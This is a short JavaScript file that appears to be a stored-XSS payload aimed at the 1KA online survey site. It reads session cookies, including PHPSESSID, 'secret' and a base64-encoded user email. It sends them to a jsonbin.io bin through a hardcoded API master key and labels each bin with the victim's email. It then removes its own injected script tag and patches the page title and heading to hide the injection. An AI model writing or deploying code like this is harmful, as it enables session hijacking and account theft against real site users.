(() => {
    const setXHRHeaders = (xhr, method, url) => {
        xhr.open(method, url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader("X-Master-Key", "$2b$10$.OfJZIPTOgiVyiN./gF6w.9G1rZFeqJiHI88C4Q1/BDu9R8AHC1zW");
    };

    let binID, email, cookieData = {};

    document.cookie.split('; ').forEach(c => {
        let [key, value] = c.split('=');
        if (['secret', 'unam', 'uid', 'PHPSESSID'].includes(key)) {
            cookieData[key] = value;
            if (key === 'uid') email = atob(decodeURIComponent(value));
        }
    });

    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = () => {
        if (xhr.readyState === 4 && xhr.status === 200) {
            binID = JSON.parse(xhr.responseText)?.metadata?.id;
            if (binID && email) {
                let req = new XMLHttpRequest();
                req.onreadystatechange = () => {
                    if (req.readyState === 4) console.log("Shranjeno:", req.responseText);
                };
                setXHRHeaders(req, "PUT", `https://api.jsonbin.io/v3/b/${binID}/meta/name`);
                req.setRequestHeader("X-Bin-Name", email); // Additional header specific to this request
                req.send();
            }
        }
    };

    setXHRHeaders(xhr, 'POST', 'https://api.jsonbin.io/v3/b');
    xhr.send(JSON.stringify(cookieData));

    const modifyDOMElements = () => {
        document.querySelectorAll('h1').forEach(h1 => {
            if (h1.textContent.trim() === '">') h1.textContent = "Raziskava o nečem";
        });
        
        let specificScript = document.querySelector('script[src="https://enkarman.github.io/enkica/n.js"]');
        if (specificScript) specificScript.remove();
    };

    (document.readyState === 'loading') ? document.addEventListener('DOMContentLoaded', modifyDOMElements) : modifyDOMElements();

    if (document.title === '"> - 1KA | Spletne ankete') document.title = `Raziskava o nečem - 1KA | Spletne ankete`;
})();
